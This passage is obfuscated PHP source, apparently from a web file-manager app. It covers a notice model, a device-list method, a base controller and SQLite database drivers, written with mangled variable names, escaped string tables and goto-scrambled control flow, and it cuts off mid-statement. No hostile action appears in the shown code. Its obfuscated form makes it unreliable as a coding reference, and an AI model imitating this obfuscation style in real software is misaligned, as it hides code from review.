$bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[2275]] = $e¸ñ©ùÓ“; $d¶¹†·£à¹ = json_decode($bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[405]], !0); $bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[2512]] = isset($d¶¹†·£à¹[$F”Ë†¾‰’ñ[2512]]) ? $d¶¹†·£à¹[$F”Ë†¾‰’ñ[2512]] : $F”Ë†¾‰’ñ[33]; goto eŠ°ï™Ì¥º; C”×Ö¹Ì: $bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[28]] = isset($e¸ñ©ùÓ“[$F”Ë†¾‰’ñ[28]]) ? $e¸ñ©ùÓ“[$F”Ë†¾‰’ñ[28]] : LNG($F”Ë†¾‰’ñ[2513]); $bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[2380]] = isset($e¸ñ©ùÓ“[$F”Ë†¾‰’ñ[2380]]) ? $e¸ñ©ùÓ“[$F”Ë†¾‰’ñ[2380]] : $F”Ë†¾‰’ñ[33]; $bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[1356]] = isset($a½¾‘ÎªÈ[$a§èÏğÅ£]) ? $a½¾‘ÎªÈ[$a§èÏğÅ£] : $fĞ³µÉ¬Üï; goto AÅ‚òàˆÀ; aŸ³Ëæ¯ ê: $a§èÏğÅ£ = $bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[29]]; $e¸ñ©ùÓ“ = isset($D¾Ü±ãª¾ª[$bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[1450]]]) ? $D¾Ü±ãª¾ª[$bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[1450]]] : !1; $fĞ³µÉ¬Üï = strpos($a§èÏğÅ£, $F”Ë†¾‰’ñ[2517]) === 0 ? LNG($F”Ë†¾‰’ñ[2518]) : LNG($F”Ë†¾‰’ñ[2513]); goto C”×Ö¹Ì; eŠ°ï™Ì¥º: $this->ipAddress($bˆëŸ‘ÚÜÔ); if (strpos($a§èÏğÅ£, $F”Ë†¾‰’ñ[2332]) === 0 || isset($d¶¹†·£à¹[$F”Ë†¾‰’ñ[2331]])) { goto AŠ¶ĞòÊ²; FÇƒĞòĞ : if ($d¶¹†·£à¹[$F”Ë†¾‰’ñ[29]] == $F”Ë†¾‰’ñ[2339]) { $d¶¹†·£à¹[$F”Ë†¾‰’ñ[405]][$F”Ë†¾‰’ñ[369]] = $DŸ‡ê¢ÄŒ[$d¶¹†·£à¹[$F”Ë†¾‰’ñ[405]][$F”Ë†¾‰’ñ[369]]]; } if ($d¶¹†·£à¹[$F”Ë†¾‰’ñ[29]] == $F”Ë†¾‰’ñ[2087]) { $d¶¹†·£à¹[$F”Ë†¾‰’ñ[2344]] = $d¶¹†·£à¹[$F”Ë†¾‰’ñ[391]]; $d¶¹†·£à¹[$F”Ë†¾‰’ñ[2331]] = $d¶¹†·£à¹[$F”Ë†¾‰’ñ[2344]][$F”Ë†¾‰’ñ[369]]; $d¶¹†·£à¹[$F”Ë†¾‰’ñ[391]] = !1; $d¶¹†·£à¹[$F”Ë†¾‰’ñ[369]] = $F”Ë†¾‰’ñ[33]; } if ($d¶¹†·£à¹[$F”Ë†¾‰’ñ[391]] && $d¶¹†·£à¹[$F”Ë†¾‰’ñ[391]][$F”Ë†¾‰’ñ[371]] == $F”Ë†¾‰’ñ[1093]) { $F·‚ó»©âã[] = $bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[367]]; unset($aÑˆ‚ìğÆğ[$cã‚ãÁ›„Ú]); continue; } goto EàË¬¹¹«›; EàË¬¹¹«›: if ($d¶¹†·£à¹[$F”Ë†¾‰’ñ[2344]] && $d¶¹†·£à¹[$F”Ë†¾‰’ñ[2344]][$F”Ë†¾‰’ñ[371]] == $F”Ë†¾‰’ñ[1093]) { $F·‚ó»©âã[] = $bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[367]]; unset($aÑˆ‚ìğÆğ[$cã‚ãÁ›„Ú]); continue; } goto D¬®»Šêâø; AŠ¶ĞòÊ²: $d¶¹†·£à¹[$F”Ë†¾‰’ñ[391]] = $DŸ‡ê¢ÄŒ[$d¶¹†·£à¹[$F”Ë†¾‰’ñ[369]]]; $d¶¹†·£à¹[$F”Ë†¾‰’ñ[2344]] = $DŸ‡ê¢ÄŒ[$d¶¹†·£à¹[$F”Ë†¾‰’ñ[2331]]]; if ($d¶¹†·£à¹[$F”Ë†¾‰’ñ[29]] == $F”Ë†¾‰’ñ[494]) { $d¶¹†·£à¹[$F”Ë†¾‰’ñ[405]][$F”Ë†¾‰’ñ[1020]] = $DŸ‡ê¢ÄŒ[$d¶¹†·£à¹[$F”Ë†¾‰’ñ[405]][$F”Ë†¾‰’ñ[1020]]]; $d¶¹†·£à¹[$F”Ë†¾‰’ñ[405]][$F”Ë†¾‰’ñ[1021]] = $DŸ‡ê¢ÄŒ[$d¶¹†·£à¹[$F”Ë†¾‰’ñ[405]][$F”Ë†¾‰’ñ[1021]]]; } goto FÇƒĞòĞ ; D¬®»Šêâø: } $bˆëŸ‘ÚÜÔ[$F”Ë†¾‰’ñ[405]] = $d¶¹†·£à¹; goto aŒÏæØ»Ú; D›¹Ñ Û‡¦: } $this->clearSystemPathLog($F·‚ó»©âã); goto bö§ºÅö÷; FóÑ¨í£ó‰: $DŸ‡ê¢ÄŒ = $this->getSourceList($aÑˆ‚ìğÆğ); $a½¾‘ÎªÈ = $this->typeAll(); $Dƒœù…‹Ï• = array(); goto DÊÃèÁÒ»‡; cĞ‡›Üè‘ì: } private function clearSystemPathLog($FØ¼ºğ¼Çè) { $Eâô…˜—ïâ =& $_SERVER[¬ˆÚÂ”Éğä]; if (count($FØ¼ºğ¼Çè) == 0) { return; } $A‘¬¾ºÎ° = array($Eâô…˜—ïâ[367] => array($Eâô…˜—ïâ[7], array_unique($FØ¼ºğ¼Çè))); $this->where($A‘¬¾ºÎ°)->delete(); } public function deviceList($CÛÏ÷Ú³¬õ, $B­é½ƒÍ±½ = 0) { $CõƒÈƒøè =& $_SERVER[¬ˆÚÂ”Éğä]; $FÈˆ‹¢–¿¬ = array($CõƒÈƒøè[1450] => $CÛÏ÷Ú³¬õ, $CõƒÈƒøè[187] => array($CõƒÈƒøè[940], $B­é½ƒÍ±½), $CõƒÈƒøè[29] => $CõƒÈƒøè[2060]); $eî‚£çå·– = array(); $aÒá¦Ãøé = $this->field($CõƒÈƒøè[2520])->where($FÈˆ‹¢–¿¬)->order($CõƒÈƒøè[2342])->limit(50)->select(); foreach ($aÒá¦Ãøé as $cÙ›Ç éŸà => $Aêï–Œô°ñ) { goto bİÔÇÈÖù; BÃŠ‚¡Î¬: $this->ipAddress($Aêï–Œô°ñ); $Aêï–Œô°ñ[$CõƒÈƒøè[405]] = $B²¢£óã¯Í; $eî‚£çå·–[$DÅò’ÉÇê] = $Aêï–Œô°ñ; goto aâ¤±µ¨±; bİÔÇÈÖù: if ($cÙ›Ç éŸà > 0 && abs($Aêï–Œô°ñ[$CõƒÈƒøè[187]] - $aÒá¦Ãøé[$cÙ›Ç éŸà - 1][$CõƒÈƒøè[187]]) < 5) { continue; } $B²¢£óã¯Í = json_decode($Aêï–Œô°ñ[$CõƒÈƒøè[405]], !0); $Aêï–Œô°ñ[$CõƒÈƒøè[2512]] = isset($B²¢£óã¯Í[$CõƒÈƒøè[2512]]) ? $B²¢£óã¯Í[$CõƒÈƒøè[2512]] : $CõƒÈƒøè[33]; goto báÅíêğİ; báÅíêğİ: unset($B²¢£óã¯Í[$CõƒÈƒøè[2512]]); $DÅò’ÉÇê = $this->deviceType($B²¢£óã¯Í[$CõƒÈƒøè[2333]]); if (isset($eî‚£çå·–[$DÅò’ÉÇê])) { continue; } goto BÃŠ‚¡Î¬; aâ¤±µ¨±: } return array_values($eî‚£çå·–); } public function deviceType($F´Üå†©Íµ) { return $F´Üå†©Íµ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x6e\x6f\164\x69\143\x65\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\143\x6f\x6e\164\x65\156\164", "\x61\165\164\x68", "\155\157\x64\145", "\x74\151\155\145", "\164\x79\160\145", "\x6c\145\166\x65\x6c", "\x65\x6e\x61\x62\x6c\x65", "\163\157\162\x74"); public function listData($a¬šßË»ã¶ = false, $b³öĞÇ¡‹ = "\163\x6f\x72\x74", $fÑÄšÔœÆí = false) { return parent::listData($a¬šßË»ã¶, $b³öĞÇ¡‹, $fÑÄšÔœÆí); } public function add($EÌ‚²âÓÈÚ) { $D¸ÎòòÑ =& $_SERVER[¬ˆÚÂ”Éğä]; $Føªˆ¤ºµŠ = time(); if ($EÌ‚²âÓÈÚ[$D¸ÎòòÑ[12]] == $D¸ÎòòÑ[2521]) { $Føªˆ¤ºµŠ = strtotime($EÌ‚²âÓÈÚ[$D¸ÎòòÑ[190]]); } $EÌ‚²âÓÈÚ[$D¸ÎòòÑ[190]] = $Føªˆ¤ºµŠ; return parent::insert($EÌ‚²âÓÈÚ); } public function update($FŸÃê“á©, $A¤ìğ·’¡Œ) { goto c››ã†ÚÍÊ; b²¸Ü¯İ—: $eİÎäİíçô = time(); if ($A¤ìğ·’¡Œ[$dØ¤“ó¤íÌ[12]] == $dØ¤“ó¤íÌ[2521]) { $eİÎäİíçô = strtotime($A¤ìğ·’¡Œ[$dØ¤“ó¤íÌ[190]]); } $A¤ìğ·’¡Œ[$dØ¤“ó¤íÌ[190]] = $eİÎäİíçô; goto D³Ğ—Ù±Àö; c››ã†ÚÍÊ: $dØ¤“ó¤íÌ =& $_SERVER[¬ˆÚÂ”Éğä]; $Bç’´‰ø‚á = $this->listData($FŸÃê“á©); if (!$Bç’´‰ø‚á) { return !1; } goto b²¸Ü¯İ—; D³Ğ—Ù±Àö: return parent::update($FŸÃê“á©, $A¤ìğ·’¡Œ); goto E¥ßÍ…Ôë£; E¥ßÍ…Ôë£: } public function remove($bÒŸùÉÆ†‘) { $a™ë’¹“©Ş = $this->listData($bÒŸùÉÆ†‘); if (!$a™ë’¹“©Ş || $a™ë’¹“©Ş[$_SERVER[¬ˆÚÂ”Éğä][1093]]) { return !1; } return parent::remove($bÒŸùÉÆ†‘); } public function sort($CæøÄ½´ÒÌ, $EÛÛ—´‚¤) { return parent::update($CæøÄ½´ÒÌ, $EÛÛ—´‚¤); } public function enable($FêöŞºº•, $d’œªÑÌá) { return parent::update($FêöŞºº•, array($_SERVER[¬ˆÚÂ”Éğä][2522] => $d’œªÑÌá)); } private function initUserOption() { $bíê¿‹ÖÑÒ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->optionType = $bíê¿‹ÖÑÒ[2523]; $this->modelType = $bíê¿‹ÖÑÒ[2524]; $this->field = array($bíê¿‹ÖÑÒ[2525], $bíê¿‹ÖÑÒ[28], $bíê¿‹ÖÑÒ[190], $bíê¿‹ÖÑÒ[29], $bíê¿‹ÖÑÒ[2526], $bíê¿‹ÖÑÒ[697], $bíê¿‹ÖÑÒ[183]); } public function userNoticeGet($D»™£ï’Øå = false) { $this->initUserOption(); return parent::listData($D»™£ï’Øå, $_SERVER[¬ˆÚÂ”Éğä][367], !0); } public function userNoticeAdd($Dî§ŒÈİÍ) { $B«¹ùÏÄ é =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initUserOption(); $f÷±†æ³µ = $this->findByKey($B«¹ùÏÄ é[2525], $Dî§ŒÈİÍ[$B«¹ùÏÄ é[367]]); if ($f÷±†æ³µ) { return !0; } $FÜŒæ“¬˜® = array($B«¹ùÏÄ é[2525] => $Dî§ŒÈİÍ[$B«¹ùÏÄ é[367]], $B«¹ùÏÄ é[28] => $Dî§ŒÈİÍ[$B«¹ùÏÄ é[28]], $B«¹ùÏÄ é[190] => $Dî§ŒÈİÍ[$B«¹ùÏÄ é[190]], $B«¹ùÏÄ é[29] => isset($Dî§ŒÈİÍ[$B«¹ùÏÄ é[29]]) ? $Dî§ŒÈİÍ[$B«¹ùÏÄ é[29]] : 1, $B«¹ùÏÄ é[2526] => isset($Dî§ŒÈİÍ[$B«¹ùÏÄ é[2526]]) ? $Dî§ŒÈİÍ[$B«¹ùÏÄ é[2526]] : 0, $B«¹ùÏÄ é[697] => 0, $B«¹ùÏÄ é[183] => 0); return parent::insert($FÜŒæ“¬˜®); } public function userNoticeEdit($fÌğ‹Á¶Âá, $b„¿£¡Ê¡¿) { $this->initUserOption(); return parent::update($fÌğ‹Á¶Âá, $b„¿£¡Ê¡¿); } } goto CÚ½Ó«ÎÕ‰; eÍÑª·°‹‘: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto eˆ‡Î—‡ö®; eˆ‡Î—‡ö®: $Eß·ù­ª‚ =& $_SERVER[¬ˆÚÂ”Éğä]; global $in, $config; $this->config =& $config; goto DĞ¤Š¹è²ï; DŸË´‹Ïè»: $this->tpl = TEMPLATE . MOD . $Eß·ù­ª‚[8]; $this->_classObjectID = mt_rand(0, 10000); goto BÂ°Çå±Ö·; DĞ¤Š¹è²ï: $this->in =& $in; $this->values[$Eß·ù­ª‚[6]] =& $config; $this->values[$Eß·ù­ª‚[7]] =& $in; goto DŸË´‹Ïè»; BÂ°Çå±Ö·: } public function loadClass($BÃïÍ»¤Ä) { if (1 === func_num_args()) { $this->{$BÃïÍ»¤Ä} = new $BÃïÍ»¤Ä(); } else { $bç¹íô®º = new ReflectionClass($BÃïÍ»¤Ä); $DÑ¤Î¢È™ = func_get_args(); array_shift($DÑ¤Î¢È™); $this->{$BÃïÍ»¤Ä} = $bç¹íô®º->newInstanceArgs($DÑ¤Î¢È™); } return $this->{$BÃïÍ»¤Ä}; } protected function assign($CÀİš´ùš…, $EéËÌ²â¦Ü) { $this->values[$CÀİš´ùš…] = $EéËÌ²â¦Ü; } protected function display($CÛ¹„ğÆ‰¡) { ob_end_clean(); extract($this->values); require $this->tpl . $CÛ¹„ğÆ‰¡; } } class DbSqliteBase extends Db { public function __construct($f°ù˜¦½÷ = '') { $e¦ô¯æ¶ÜÏ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!extension_loaded($e¦ô¯æ¶ÜÏ[9])) { think_exception(think_lang($e¦ô¯æ¶ÜÏ[10]) . $e¦ô¯æ¶ÜÏ[11]); } if (!empty($f°ù˜¦½÷)) { if (!isset($f°ù˜¦½÷[$e¦ô¯æ¶ÜÏ[12]])) { $f°ù˜¦½÷[$e¦ô¯æ¶ÜÏ[12]] = 438; } $this->config = $f°ù˜¦½÷; if (empty($this->config[$e¦ô¯æ¶ÜÏ[13]])) { $this->config[$e¦ô¯æ¶ÜÏ[13]] = array(); } } } public function connect($eŒÒäšˆ¯Ì = '', $EŒÌùƒºğ = 0) { $eç´ó¿ØÏº =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($this->linkID[$EŒÌùƒºğ])) { goto d¾ˆ©Õ§µÖ; CˆÖÊ“¸: @sqlite_busy_timeout($this->linkID[$EŒÌùƒºğ], 30000); if (1 != think_config($eç´ó¿ØÏº[18])) { unset($this->config); } goto EöÕÉÊ»·¡; d¾ˆ©Õ§µÖ: if (empty($eŒÒäšˆ¯Ì)) { $eŒÒäšˆ¯Ì = $this->config; } $B¶´Äæá¬Ï = !empty($eŒÒäšˆ¯Ì[$eç´ó¿ØÏº[13]][$eç´ó¿ØÏº[14]]) ? $eŒÒäšˆ¯Ì[$eç´ó¿ØÏº[13]][$eç´ó¿ØÏº[14]] : $this->pconnect; $fŠ†›¾…¼² = $B¶´Äæá¬Ï ? $eç´ó¿ØÏº[15] : $eç´ó¿ØÏº[16]; goto CÖğÆœ¿‚æ; CÖğÆœ¿‚æ: $this->linkID[$EŒÌùƒºğ] = $fŠ†›¾…¼²($eŒÒäšˆ¯Ì[$eç´ó¿ØÏº[17]], $eŒÒäšˆ¯Ì[$eç´ó¿ØÏº[12]]); if (!$this->linkID[$EŒÌùƒºğ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto CˆÖÊ“¸; EöÕÉÊ»·¡: } return $this->linkID[$EŒÌùƒºğ]; } public function free() { $this->queryID = null; } public function query($Cé½ƒŒ¿ïÎ) { goto EçÅó‡¨Ì¾; dÌ©¦¨«¿ó: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $BŸ†°Ó¶– = $this->getAll(); return $BŸ†°Ó¶–; } goto EÊ¶Ú‡³Õ; EçÅó‡¨Ì¾: $AÎæÀ’®ºß =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a‘¤ºØíàÃ; a‘¤ºØíàÃ: $this->queryStr = $Cé½ƒŒ¿ïÎ; if ($this->queryID) { $this->free(); } think_action_status($AÎæÀ’®ºß[19], 1); goto Fš²„İ›¾İ; Fš²„İ›¾İ: think_status($AÎæÀ’®ºß[20]); $this->queryID = sqlite_query($this->_linkID, $Cé½ƒŒ¿ïÎ); $this->debug(); goto dÌ©¦¨«¿ó; EÊ¶Ú‡³Õ: } public function execute($AÒßÎ™×–¯) { goto B†ˆ¬˜È¬Æ; Eâ«®ãŞ°Ë: $this->queryStr = $AÒßÎ™×–¯; if ($this->queryID) { $this->free(); } think_action_status($cÃ‘¸¢î†¬[21], 1); goto C§ÊÜÉŠ¬»; BÕ¹Ñäàºñ: if (!1 === $c °‡ğ¦İÇ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto f‚•Áõ›×œ; C§ÊÜÉŠ¬»: think_status($cÃ‘¸¢î†¬[20]); $c °‡ğ¦İÇ = sqlite_exec($this->_linkID, $AÒßÎ™×–¯); $this->debug(); goto BÕ¹Ñäàºñ; B†ˆ¬˜È¬Æ: $cÃ‘¸¢î†¬ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eâ«®ãŞ°Ë; f‚•Áõ›×œ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¬ˆÚÂ”Éğä][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A‘Úø…˜à = sqlite_query($this->_linkID, $_SERVER[¬ˆÚÂ”Éğä][23]); if (!$A‘Úø…˜à) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÌ©ÍÅÀ½¾ = sqlite_query($this->_linkID, $_SERVER[¬ˆÚÂ”Éğä][24]); if (!$eÌ©ÍÅÀ½¾) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $BÍ²îÛ­» = array(); if ($this->numRows > 0) { for ($FÜ–ïÛˆì = 0; $FÜ–ïÛˆì < $this->numRows; $FÜ–ïÛˆì++) { $BÍ²îÛ­»[$FÜ–ïÛˆì] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $BÍ²îÛ­»; } public function getFields($aÙœÀƒæµ) { $a“Ûòé¸” =& $_SERVER[¬ˆÚÂ”Éğä]; $DÅàÊ˜†ˆ… = $this->query($a“Ûòé¸”[25] . $aÙœÀƒæµ . $a“Ûòé¸”[26]); $cö©ÑËâÈ× = array(); if ($DÅàÊ˜†ˆ…) { foreach ($DÅàÊ˜†ˆ… as $a§ÍÏÀÕÑ => $f¡é›ê·°) { $cö©ÑËâÈ×[$f¡é›ê·°[$a“Ûòé¸”[27]]] = array($a“Ûòé¸”[28] => $f¡é›ê·°[$a“Ûòé¸”[27]], $a“Ûòé¸”[29] => $f¡é›ê·°[$a“Ûòé¸”[30]], $a“Ûòé¸”[31] => (bool) ($f¡é›ê·°[$a“Ûòé¸”[32]] === $a“Ûòé¸”[33]), $a“Ûòé¸”[34] => $f¡é›ê·°[$a“Ûòé¸”[35]], $a“Ûòé¸”[36] => strtolower($f¡é›ê·°[$a“Ûòé¸”[37]]) == $a“Ûòé¸”[38], $a“Ûòé¸”[39] => strtolower($f¡é›ê·°[$a“Ûòé¸”[40]]) == $a“Ûòé¸”[41]); } } return $cö©ÑËâÈ×; } public function getTables($A›•ŞáŸÒ„ = '') { $B×æµ‚‡Œ =& $_SERVER[¬ˆÚÂ”Éğä]; $d‰³ÅÑó§Ô = $this->query($B×æµ‚‡Œ[42] . $B×æµ‚‡Œ[43] . $B×æµ‚‡Œ[44]); $DÈĞÜ‘¿ğÇ = array(); foreach ($d‰³ÅÑó§Ô as $aá‰­çíà— => $DÖ–²²’Ğ) { $DÈĞÜ‘¿ğÇ[$aá‰­çíà—] = current($DÖ–²²’Ğ); } return $DÈĞÜ‘¿ğÇ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $b˜äÑœ‡Æ =& $_SERVER[¬ˆÚÂ”Éğä]; $E­º•—ƒ» = sqlite_last_error($this->_linkID); $this->error = $E­º•—ƒ» . $b˜äÑœ‡Æ[4] . sqlite_error_string($E­º•—ƒ»); if ($b˜äÑœ‡Æ[33] != $this->queryStr) { $this->error .= LNG($b˜äÑœ‡Æ[45]) . $this->queryStr; } think_trace($this->error, $b˜äÑœ‡Æ[33], $b˜äÑœ‡Æ[46]); return $this->error; } public function escapeString($E¿àÔ±ñï) { return sqlite_escape_string($E¿àÔ±ñï); } public function parseLimit($D¯–¬±äğ÷) { $AÚ°—Šé =& $_SERVER[¬ˆÚÂ”Éğä]; $C²¨©¾ùÛ¯ = $AÚ°—Šé[33]; if (!empty($D¯–¬±äğ÷)) { $D¯–¬±äğ÷ = explode($AÚ°—Šé[47], $D¯–¬±äğ÷); if (count($D¯–¬±äğ÷) > 1) { $C²¨©¾ùÛ¯ .= $AÚ°—Šé[48] . $D¯–¬±äğ÷[1] . $AÚ°—Šé[49] . $D¯–¬±äğ÷[0] . $AÚ°—Šé[50]; } else { $C²¨©¾ùÛ¯ .= $AÚ°—Šé[48] . $D¯–¬±äğ÷[0] . $AÚ°—Šé[50]; } } return $C²¨©¾ùÛ¯; } } class DbSqlite3Base extends Db { public function __construct($A¦ö§™øÅ÷ = '') { $dØö‹±õ¯Ç =& $_SERVER[¬ˆÚÂ”Éğä]; if (!class_exists($dØö‹±õ¯Ç[51])) { think_exception(think_lang($dØö‹±õ¯Ç[10]) . $dØö‹±õ¯Ç[52]); } if (!empty($A¦ö§™øÅ÷)) { if (!isset($A¦ö§™øÅ÷[$dØö‹±õ¯Ç[12]])) { $A¦ö§™øÅ÷[$dØö‹±õ¯Ç[12]] = 438; } $this->config = $A¦ö§™øÅ÷; if (empty($this->config[$dØö‹±õ¯Ç[13]])) { $this->config[$dØö‹±õ¯Ç[13]] = array(); } } } public function connect($CÔÏ’µÃŠæ = '', $D¶è¦·ù³Ï = 0) { $D¸§ãÂƒõ° =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($this->linkID[$D¶è¦·ù³Ï])) { if (empty($CÔÏ’µÃŠæ)) { $CÔÏ’µÃŠæ = $this->config; } $this->linkID[$D¶è¦·ù³Ï] = new SQLite3($CÔÏ’µÃŠæ[$D¸§ãÂƒõ°[17]]); if (!$this->linkID[$D¶è¦·ù³Ï]) { think_exception($this->linkID[$D¶è¦·ù³Ï]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$D¶è¦·ù³Ï]->busyTimeout(30000); if (1 != think_config($D¸§ãÂƒõ°[18])) { unset($this->config); } } return $this->linkID[$D¶è¦·ù³Ï]; } public function free() { $this->queryID = null; } public function query($FÑÊš²º˜Ó) { goto CŠŒ¡à¼Ş; CŠŒ¡à¼Ş: $c£Ã…ø’ÇÉ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a¸š”¼‰•; Bã¹¾ä©í: if (!1 === $this->queryID) { $this->error(); return !1; } else { $bÌ½·»“ = $this->getAll(); $this->numRows = count($bÌ½·»“); return $bÌ½·»“; } goto fßÙÖÓ‚ÔÈ; c½âé—óÎ: think_status($c£Ã…ø’ÇÉ[20]); $this->queryID = $this->_linkID->query($FÑÊš²º˜Ó); $this->debug(); goto Bã¹¾ä©í; a¸š”¼‰•: $this->queryStr = $FÑÊš²º˜Ó; if ($this->queryID) { $this->free(); } think_action_status($c£Ã…ø’ÇÉ[19], 1); goto c½âé—óÎ; fßÙÖÓ‚ÔÈ: } public function execute($EÏ—º‚ÄŠæ) { goto FÂµÜ‘¨•½; cÙĞİŠÔø: if (!1 === $eÁì·©š¯«) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto EÃö½ÑÜÁÓ; D‚¦•ç«…: $this->queryStr = $EÏ—º‚ÄŠæ; if ($this->queryID) { $this->free(); } think_action_status($f´„Í‘©ã[21], 1); goto dÎ¤Ÿ­Œùƒ; FÂµÜ‘¨•½: $f´„Í‘©ã =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D‚¦•ç«…; dÎ¤Ÿ­Œùƒ: think_status($f´„Í‘©ã[20]); $eÁì·©š¯« = $this->_linkID->exec($EÏ—º‚ÄŠæ); $this->debug(); goto cÙĞİŠÔø; EÃö½ÑÜÁÓ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¬ˆÚÂ”Éğä][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eßÅ×İ¿Ñƒ = $this->_linkID->query($_SERVER[¬ˆÚÂ”Éğä][23]); if (!$eßÅ×İ¿Ñƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $f„î§³¥ÛÜ = $this->_linkID->query($_SERVER[¬ˆÚÂ”Éğä][24]); if (!$f„î§³¥ÛÜ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Fé¤ñè®áâ = array(); while ($b¥· ›¯¤  = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Fé¤ñè®áâ[] = $b¥· ›¯¤ ; } $this->queryID->reset(); return $Fé¤ñè®áâ; } public function getFields($BÏõ‰ñê‚Ä) { $fìÖ õŞÔø =& $_SERVER[¬ˆÚÂ”Éğä]; $Bö‚Ï³ÓõÂ = $this->query($fìÖ õŞÔø[25] . $BÏõ‰ñê‚Ä . $fìÖ õŞÔø[26]); $bŸå†ãË‹÷ = array(); if ($Bö‚Ï³ÓõÂ) { foreach ($Bö‚Ï³ÓõÂ as $AºÔÚÓ‰Èø => $aÆ Šƒµ«) { $bŸå†ãË‹÷[$aÆ Šƒµ«[$fìÖ õŞÔø[28]]] = array($fìÖ õŞÔø[28] => $aÆ Šƒµ«[$fìÖ õŞÔø[28]], $fìÖ õŞÔø[29] => $aÆ Šƒµ«[$fìÖ õŞÔø[29]], $fìÖ õŞÔø[31] => (bool) ($aÆ Šƒµ«[$fìÖ õŞÔø[31]] === $fìÖ õŞÔø[33]), $fìÖ õŞÔø[34] => $aÆ Šƒµ«[$fìÖ õŞÔø[53]], $fìÖ õŞÔø[36] => (bool) $aÆ Šƒµ«[$fìÖ õŞÔø[54]], $fìÖ õŞÔø[39] => (bool) $aÆ Šƒµ«[$fìÖ õŞÔø[54]]); } } return $bŸå†ãË‹÷; } public function getTables($dÔÚèºä®œ = '') { $bÈôâİºÎ =& $_SERVER[¬ˆÚÂ”Éğä]; $D¸ë“÷Æ½é = $this->query($bÈôâİºÎ[42] . $bÈôâİºÎ[43] . $bÈôâİºÎ[44]); $AÂğ¤¸Í– = array(); foreach ($D¸ë“÷Æ½é as $cÒí·»ƒµÜ => $BÎŠé˜ÂŞ‰) { $AÂğ¤¸Í–[$cÒí·»ƒµÜ] = current($BÎŠé˜ÂŞ‰); } return $AÂğ¤¸Í–; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $a¦•‘â¸ó™ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->error = $this->_linkID->lastErrorMsg(); if ($a¦•‘â¸ó™[33] != $this->queryStr) { $this->error .= LNG($a¦•‘â¸ó™[45]) . $this->queryStr; } think_trace($this->error, $a¦•‘â¸ó™[33], $a¦•‘â¸ó™[46]); return $this->error; } public function escapeString($F×á²’¦•Ô) { $EçÒø‹Å¶Í =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->_linkID) { return $this->_linkID->escapeString($F×á²’¦•Ô); } return str_ireplace($EçÒø‹Å¶Í[55], $EçÒø‹Å¶Í[56], $F×á²’¦•Ô); } public function parseLimit($eÚæ´šŸê) { $dŠÀ…§’Ë =& $_SERVER[¬ˆÚÂ”Éğä]; $d‚œÄ³Ëòå = $dŠÀ…§’Ë[33]; if (!empty($eÚæ´šŸê)) { $eÚæ´šŸê = explode($dŠÀ…§’Ë[47], $eÚæ´šŸê); if (count($eÚæ´šŸê) > 1) { $d‚œÄ³Ëòå .= $dŠÀ…§’Ë[48] . $eÚæ´šŸê[1] . $dŠÀ…§’Ë[49] . $eÚæ´šŸê[0] . $dŠÀ…§’Ë[50]; } else { $d‚œÄ³Ëòå .= $dŠÀ…§’Ë[48] . $eÚæ´šŸê[0] . $dŠÀ…§’Ë[50]; } } return $d‚œÄ³Ëòå; } } goto D¿¸¶Øï“â; aã¨õ‘ã¨“: class DbSqlite3 extends DbSqlite3Base { public function query($bÑÍÛÙù×á) { goto D·Ø°¤öß˜; a„Üë‚î™¥: fclose($ešØ­›øÓ¦); show_json($cÒŒŒäÒöì[886], !1); return !1; goto 